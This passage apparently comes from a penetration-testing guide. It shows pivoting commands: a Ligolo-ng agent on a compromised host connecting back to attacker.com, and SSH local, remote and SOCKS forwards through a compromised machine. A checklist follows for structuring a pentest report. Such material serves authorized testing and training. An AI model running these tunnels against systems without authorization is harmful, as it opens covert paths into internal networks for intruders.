Ligolo-ng:
# Server (attacker)ligolo-ng -laddr 0.0.0.0:11601 -selfcert# Agent (compromised host)ligolo-ng-agent -connect attacker.com:11601 -ignore-cert

# Local port forwardssh -L 8080:internal.target.com:80 user@compromised.com# Remote port forwardssh -R 9090:localhost:8080 user@attacker.com# Dynamic SOCKS proxyssh -D 1080 user@compromised.com

8.8 Reporting Structure
Executive Summary
High-level findings (Critical/High/Medium/Low counts)
Business impact assessment
Risk ratings with CVSS scores
Remediation priorities
Technical Report Sections
Scope & Methodology
Testing period
In-scope/out-of-scope assets
Testing methodology followed (PTES/OWASP/NIST)
Tools used
Findings Details (for each vulnerability)
Vulnerability title and severity
CVSS score and vector
Affected URLs/endpoints
Technical description
Proof of Concept (screenshots, commands, request/response)
Business impact
Remediation recommendations
References (CVE, CWE, OWASP)
Appendices
Test credentials used
IP addresses tested
Tools and versions
Raw output samples
Report Writing Best Practices
Use clear, non-technical language for executive summary
Include screenshots with annotations
Provide reproducible steps with exact commands
Prioritize findings by risk, not by discovery order
Include remediation code examples where possible
Verify all findings before inclusion
Get peer review before delivery
